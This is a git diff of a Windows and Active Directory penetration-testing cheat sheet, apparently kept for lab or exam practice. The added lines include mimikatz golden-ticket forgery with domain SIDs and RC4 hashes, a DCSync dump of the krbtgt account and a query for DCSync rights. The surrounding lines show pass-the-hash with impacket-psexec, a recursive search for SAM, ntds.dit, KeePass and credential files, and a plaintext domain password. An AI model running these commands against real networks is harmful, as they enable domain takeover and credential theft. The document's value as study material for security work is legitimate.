@@ -20,6 +20,7 @@ There are several key pieces of information we should always obtain:
 > net user steve
 > Get-ChildItem Env: # Environment Variables
 > $env:appkey
+> $env:path
 > cd env:appkey
 > dir # Check for USERPROFILE
 > Get-LocalUser
@@ -71,6 +72,9 @@ There are several key pieces of information we should always obtain:
 > net accounts # Obtain the account policy, lockout threshold
 > mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
 Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+# MONEYYYYY
+> netstat -p tcp
+> netstat -p tcp -f
 ```
 
 ### PowerView.ps1
@@ -164,6 +168,58 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 > bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
 > python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
 ```
+
+### PowerShell Scripts
+
+Last 1,000 Modified System Files.
+
+```bash
+Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Configuration Files.
+
+```bash
+Get-ChildItem -Path "C:\" -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTim
+```
+
+Last 1,000 Modified Executables and Scripts.
+
+```bash
+Get-ChildItem -Path "C:\" -Include *.exe,*.dll,*.ps1,*.bat,*.cmd -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Files in User Profiles.
+
+```bash
+Get-ChildItem -Path "C:\Users" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Last 1,000 Modified Files in Program Directories.
+
+```bash
+Get-ChildItem -Path "C:\Program Files","C:\Program Files (x86)" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Comprehensive One-Liner Covering Multiple Categories.
+
+```bash
+Get-ChildItem -Path "C:\Windows","C:\Program Files","C:\Program Files (x86)","C:\Users" -Include *.config,*.ini,*.xml,*.exe,*.dll,*.ps1,*.bat,*.cmd -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime
+```
+
+Export Results to a File
+
+```bash
+Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTime | Export-Csv -Path "C:\ModifiedSystemFiles.csv" -NoTypeInformation
+```
+
+Filter by Date Range: If you're interested in files modified within a specific time frame (e.g., the last 7 days):
+
+```bash
+Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge (Get-Date).AddDays(-7)} | Sort-Object LastWriteTime -Descending | Select-Object FullName, LastWriteTime
+```
+
+### BloodHound
 
 ```bash
 kali@kali:~$ sudo neo4j start
@@ -472,6 +528,9 @@ User Name SID
 corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105
 
 mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /domain:nagoya-industries.com /ptt /target:nagoya /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
+
+mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /ptt /target:nagoya.nagoya-industries.com /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
 ...
 mimikatz # exit
 
@@ -785,6 +844,8 @@ If you have the SeShutDownPrivilege, then restart the computer.
 shutdown /r /t 0
 # as alternative
 shutdown -r -t 1
+# powershell
+Restart-Computer
 ```
 
 Once you're back, confirm that everything went as planned.
@@ -1516,7 +1577,7 @@ dir /s /p local.txt
 get-service
 get-service ApacheHTTPServer | get-member
 get-service ApacheHTTPServer | Select-Object *
-Get-CIMInstance -Class Win32_Service -Filter "name ='ApacheHTTPServer' " | Select-Object *
+Get-CIMInstance -Class Win32_Service -Filter "name ='MSSQL' " | Select-Object *
 Get-CIMInstance -Class Win32_Service -filter "StartName != 'LocalSystem' AND NOT StartName LIKE 'NT Authority%' " | Select-Object * | Sort-Object StartName
 wmic service list brief
 sc query
@@ -1607,8 +1668,11 @@ PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
 To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file, which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
 
 ```bash
+.\mimikatz.exe
+privilege::debug
 lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
 lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
+lsadump::dcsync /user:dcorp\krbtgt
 
 Credentials:
   Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
@@ -1617,6 +1681,12 @@ Credentials:
 ...
 kali@kali: impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
 ````
+
+See who can do dcsync.
+
+```bash
+Get-ObjectAcl -DistinguishedName "dc=nagoya-industries,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+```
 
 #### Exploiting Certificate Authority
 
@@ -1856,3 +1926,4 @@ cd C:\windows\system32
 ```bash
 $folderPath = "C:\java\jre\bin" ; if (!(Test-Path $folderPath -PathType Container)) {     New-Item -ItemType Directory -Path $folderPath | Out-Null } $envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") ; if ($envPath -notlike "*$folderPath*") {     $newPath = "$envPath;$folderPath"  ;   [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine") }
 ```
+
